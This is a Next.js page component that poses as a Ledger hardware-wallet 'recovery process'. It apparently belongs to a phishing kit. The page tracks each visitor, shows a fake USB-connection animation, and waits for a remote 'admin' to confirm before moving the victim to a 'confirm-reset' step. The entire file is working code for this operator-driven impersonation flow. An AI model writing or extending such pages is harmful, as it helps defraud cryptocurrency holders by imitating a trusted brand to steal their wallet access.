"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { UsbAnimation } from "@/components/usb-animation"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"

export default function ConnectLedgerPage() {
  const router = useRouter()
  const [visitorId, setVisitorId] = useState<string>("")
  const [isWaiting, setIsWaiting] = useState(false)
  const [isConnected, setIsConnected] = useState(false)

  // Send heartbeat to track online status
  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (id) {
      setVisitorId(id)
      fetch(`/api/activity?visitorId=${id}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.activity) {
            // Preserve existing stage2Data if user already clicked Next
            const existingStage2 = data.activity.stage2Data
            const alreadyWaiting = existingStage2?.waitingForAdmin === true

            if (alreadyWaiting) {
              setIsWaiting(true)
              if (existingStage2?.adminConfirmed) {
                setIsConnected(true)
              }
              return
            }

            const activity: UserActivity = {
              ...data.activity,
              currentStage: "connect-ledger",
              stage2Data: {
                waitingForAdmin: false,
                adminConfirmed: false,
              },
              lastUpdated: new Date().toISOString(),
            }
            fetch("/api/activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ visitorId: id, activity }),
            })
          }
        })
    }
  }, [])

  // Poll for admin confirmation when waiting
  useEffect(() => {
    if (!isWaiting || !visitorId) return

    const checkConfirmation = async () => {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      
      if (data.activity?.stage2Data?.adminConfirmed && !isConnected) {
        // Admin confirmed, show connected state then proceed to stage 3
        setIsConnected(true)
        
        setTimeout(async () => {
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "confirm-reset",
            lastUpdated: new Date().toISOString(),
          }
          await fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
          router.push("/confirm-reset")
        }, 2000)
      }
    }

    const interval = setInterval(checkConfirmation, 1000)
    return () => clearInterval(interval)
  }, [isWaiting, visitorId, router])

  const handleNext = async () => {
    setIsWaiting(true)
    
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      
      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          currentStage: "connect-ledger",
          stage2Data: {
            waitingForAdmin: true,
            adminConfirmed: false,
          },
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="max-w-lg mx-auto text-center">
          <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-4 sm:mb-6 text-balance">
            Please connect your ledger device to continue with the recovery process
          </h1>
          
          <UsbAnimation isConnecting={isWaiting} isConnected={isConnected} />
          
          {!isWaiting && !isConnected && (
            <Button
              onClick={handleNext}
              className="bg-foreground text-background hover:bg-foreground/80 w-full sm:w-auto px-8 transition-all duration-200 hover:scale-105 active:scale-95 focus-visible:ring-2 focus-visible:ring-foreground focus-visible:ring-offset-2 focus-visible:ring-offset-background cursor-pointer mt-4"
            >
              Next
            </Button>
          )}
          {isWaiting && !isConnected && (
            <div className="mt-4">
              <p className="text-sm text-muted-foreground">Connecting to your Ledger device...</p>
            </div>
          )}
          {isConnected && (
            <div className="mt-4">
              <p className="text-sm text-muted-foreground">Redirecting to next step...</p>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}
